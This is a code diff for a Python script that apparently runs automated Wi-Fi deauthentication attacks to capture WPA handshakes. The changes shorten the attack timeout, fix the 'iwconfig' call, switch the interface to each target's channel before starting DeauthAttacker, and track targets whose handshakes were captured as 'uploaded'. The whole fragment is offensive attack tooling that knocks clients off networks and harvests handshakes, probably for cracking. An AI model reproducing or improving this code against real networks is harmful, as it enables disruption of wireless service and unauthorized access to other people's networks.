@@ -10,13 +10,14 @@ import subprocess
 import logging
 
 
-ATTACK_TIMEOUT = 3 * 60
+ATTACK_TIMEOUT = 1 * 60
 # INTEL_TIME = 1 * 60
 INTEL_TIME = 5
 
 
 def set_channel(iface, channel):
-    subprocess.check_call(["iwconfing", iface, "channel", str(channel)])
+    logging.info("changing channel to %d" % channel)
+    subprocess.check_call(["iwconfig", iface, "channel", str(channel)])
 
 
 def str2addr(s):
@@ -27,7 +28,7 @@ def str2addr(s):
 def filter_failed(failed):
     current = time.time()
     return {target: time for target, time in failed.iteritems()
-            if current - time < ATTACK_TIMEOUT / 2}
+            if current - time < ATTACK_TIMEOUT * 3}
 
 
 def main(args):
@@ -65,11 +66,12 @@ def main(args):
         logging.info("attacking target %s" % str(target.bssid))
         attack = attacker.DeauthAttacker(parsed.iface, target,
                                          client=clients[0] if clients else None)
+        set_channel(parsed.iface, target.channel)
         attack.start()
         try:
             logging.info("waiting for handshake, %d seconds" % ATTACK_TIMEOUT)
             stripper.wait_load(target, ATTACK_TIMEOUT)
-            uploaded.add(target.bssid)
+            uploaded.append(target.bssid)
         except exceptions.Exception as e:
             logging.info(
                 "failed (%s) attacking %s, will not attack it for %d seconds" %
